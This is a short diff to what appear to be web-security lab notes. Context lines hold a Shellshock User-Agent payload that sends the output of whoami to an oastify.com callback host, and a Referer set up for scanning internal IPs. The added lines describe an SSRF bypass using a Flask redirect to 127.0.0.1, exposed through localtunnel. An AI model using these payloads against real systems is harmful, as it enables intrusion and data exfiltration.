@@ -32,3 +32,16 @@ Cookie: session=68HsKn4XtgnsWRp1leKOfwkIYVz5ctv6
 ..
 User-Agent: () { :; }; /usr/bin/nslookup $(whoami).nwn3o2b3c2kc4yi5aud1j1v7qywpkg85.oastify.com
 Referer:http://192.168.0.§1§:8080
+
+//Using redirect techniques to bypass  this SSRF protection.
+1- Building the own server
+    from flask import Flask
+    app = Flask(__name__)
+    @app.route('/')
+    def home():
+      return redirect("http://127.0.0.1/secret", code=302)
+    app.run()
+2- Tunnel to expose the local ip
+     npm install -g localtunnel
+     npx lt -p 5000
+
